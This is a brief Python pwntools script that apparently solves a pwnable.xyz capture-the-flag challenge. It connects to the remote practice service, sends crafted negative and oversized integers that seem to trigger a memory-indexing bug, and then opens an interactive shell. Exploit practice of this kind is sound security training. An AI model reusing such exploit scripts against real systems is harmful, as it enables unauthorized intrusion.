from pwn import *


#sh = process('./challenge')
sh = remote('svc.pwnable.xyz',30003)

sh.sendline('-2702159776422297600  -2702159776422297600 -6') 

sleep(2)

sh.sendline('0 184549376 -5')

sleep(2)

sh.sendline('a')

sh.interactive()


